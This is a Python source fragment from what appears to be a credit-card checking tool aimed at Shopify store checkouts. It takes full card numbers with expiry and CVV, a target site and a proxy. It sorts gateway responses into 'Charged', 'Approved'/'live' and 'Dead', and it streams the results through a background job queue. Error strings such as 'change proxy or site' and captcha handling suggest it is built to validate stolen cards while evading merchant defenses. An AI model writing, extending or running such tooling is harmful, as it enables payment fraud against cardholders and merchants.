        'incorrect_number', 'expired_card', 'processing_error', 'fraudulent',
        'fraud_suspected', 'invalid_payment_error', 'generic_decline',
        'lost', 'stolen', 'pickup', 'expired', 'restricted_card',
        'card_not_supported', 'card_brand_blocked', 'invalid_number',
        'incorrect_number', 'invalid_expiry', 'not_permitted',
        'security_violation', 'transaction_not_allowed', 'test_mode_live_card',
        'live_mode_test_card', 'invalid_account', 'revocation_of_all_authorizations',
        'revocation_of_authorization', 'card_declined_temporarily',
        'payments_credit_card_verification_value_invalid_for_card_type'
    ]

    system_error_patterns = [
        'r4 token empty', 'r3 token empty', 'r2 id empty', 'risky', 'product not found',
        'step 1 failed', 'product id is empty', 'handle is empty',
        'receipt id is empty', 'receipt_empty', 'products', 'invalid_purchase_type',
        'session token not found', '$x_checkout_one_session_token', 'token empty',
        'token not found', 'invalid_tokeñ', 'invalid_response', 'invalid url',
        'invalid json', 'stock_problems', 'stock-problems', 'out of stock',
        'sold out', 'this product is currently unavailable', 'item is out of stock',
        'some items in your cart are no longer available', 'delivery ammount empty',
        'del ammount empty', 'delivery rates are empty', 'shipping info is empty',
        'card token is empty', 'payment method identifier is empty',
        'payment method is not shopify', 'not shopify', 'no valid products',
        'site requires login', 'site not supported', 'bad site', 'failed to get token',
        'failed to get shipping rates', 'failed to get checkout', 'captcha',
        'hcaptcha', 'captcha_required', 'cloudflare', 'connection error',
        'connection failed', 'timed out', 'timeout', 'access denied', 'tlsv1 alert',
        'ssl routines', 'openssl ssl_connect', 'could not resolve',
        'could not resolve host', 'domain name not found', 'name or service not known',
        'resolve', 'curl error', 'connect tunnel failed', 'empty reply from server',
        'gateway timeout', 'bad gateway', 'internal server error',
        'service unavailable', 'server error', 'client error', 'http error',
        'http_error_504', '504', 'failed', 'error', 'error processing card',
        'error in 1st req', 'error in 1 req', 'amount_too_small',
        'change proxy or site', 'tax ammount empty', 'tax_new_tax_must_be_accepted',
        'delivery_company_required', 'delivery_no_delivery_strategy_available',
        'delivery_delivery_line_detail_changed',
        'waiting_pending_terms', 'tax/price changed',
        'na', 'n/a', 'item', 'site error', 'proxy error',
        'required_artifacts_unavailable', 'merchandise_out_of_stock',
        'delivery_address2_required', 'validation_custom',
        'delivery_no_delivery_strategy_available_for_merchandise_line',
        'required_artifacts', 'required_arti',
        'payments_credit_card_brand_not_supported', 'payments_invalid_gateway_for_development_store',
        'payments_proposed_gateway_unavailable', 'payments_payment_flexibility_terms_id_mismatch'
    ]

    if any(k in resp_lower for k in charged_patterns):
        return "Charged", resp, "-"
    if any(k in resp_lower for k in tds_patterns):
        return "3DS", resp, "-"
    
    is_approved = any(k in resp_lower for k in approved_patterns)
    if not is_approved:
        if re.search(r'\blive\b', resp_lower):
            is_approved = True
            
    if is_approved:
        return "Approved", resp, "-"
        
    if any(k in resp_lower for k in declined_patterns):
        return "Dead", resp, "-"
    if any(k in resp_lower for k in system_error_patterns):
        return "Error", resp, "-"

    return "Error", resp if resp else "No response", "-"


# =====================================================================
# BAHAGIAN BARU: SISTEM STREAMING UNTUK ELAKKAN RAILWAY TIMEOUT
# =====================================================================

async def run_background_process(job_id: str, card_str: str, site_url: str, proxy_str: str):
    queue = asyncio.Queue()
    
    from main import active_streams
    active_streams[job_id] = queue

    parts = card_str.split("|")
    if len(parts) != 4:
        await queue.put({"type": "error", "msg": "Invalid card format"})
        return

    cc, mes, ano, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    if len(ano) == 2: ano = "20" + ano
    site = site_url.strip().rstrip("/")
    if not site.startswith("http"): site = "https://" + site

    await queue.put({"type": "log", "msg": "[INIT] Stream connected. Engine processing..."})

    try:
        success, message, gateway, price, currency = await process_card(
            queue, cc=cc, mes=mes, ano=ano, cvv=cvv, site_url=site, proxy_str=proxy_str
        )
        
        final_msg = message if message else "UNKNOWN_ERROR"
        status, _, _ = _classify_response(final_msg)
        
        await queue.put({"type": "result", "status": status, "message": final_msg, "price": price})
        
    except Exception as e:
        await queue.put({"type": "error", "msg": f"Fatal: {str(e)}"})
    finally:
        await queue.put({"type": "done"})
        await asyncio.sleep(5)
        if job_id in active_streams: del active_streams[job_id]


async def get_stream_generator(job_id: str):
    from main import active_streams
    queue = active_streams.get(job_id)
    
    if not queue:
        yield f"data: {json.dumps({'type': 'error', 'msg': 'Job ID not found or expired'})}\n\n"
        return

    while True:
        try:
            data = await asyncio.wait_for(queue.get(), timeout=30.0)
            if data.get("type") == "done":
                break
            yield f"data: {json.dumps(data)}\n\n"
        except asyncio.TimeoutError:
            yield f"data: {json.dumps({'type': 'log', 'msg': '[KEEP-ALIVE] Waiting for backend process...'})}\n\n"
